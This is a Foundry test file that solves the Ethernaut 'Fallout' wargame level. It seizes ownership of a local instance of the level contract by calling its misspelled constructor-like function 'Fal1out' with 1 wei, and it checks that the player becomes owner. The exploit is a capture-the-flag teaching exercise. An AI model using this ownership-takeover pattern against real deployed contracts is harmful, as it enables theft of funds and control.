// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {Fallout} from "../src/Fallout/Fallout.sol";
import {FalloutFactory} from "../src/Fallout/FalloutFactory.sol";

contract FalloutTest is Test {
    Ethernaut public ethernaut;
    address public player = makeAddr("player");
    uint256 public constant PLAYER_STARTING_BALANCE = 5 ether;
    uint256 public constant AMOUNT_TO_SEND = 1 wei;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, PLAYER_STARTING_BALANCE);
    }

    function testFalloutHack() public {
        ////////////////////*/
        //    Level Setup
        ////////////////////*/
        FalloutFactory factory = new FalloutFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        ////////////////////*/
        //   Level Attack
        ////////////////////*/
        address owner = ethernautFallout.owner();
        console2.log("Fallout Owner Before Attack", owner);
        ethernautFallout.Fal1out{value: AMOUNT_TO_SEND}();
        address newOwner = ethernautFallout.owner();
        console2.log("Fallout Owner After Attack", newOwner);
        assertEq(newOwner, player);

        //////////////////////*/
        //  Level Submission
        //////////////////////*/
        bool levelCompleted = ethernaut.submitLevelInstance(payable(address(levelAddress)));
        vm.stopPrank();
        assertTrue(levelCompleted);
    }
}
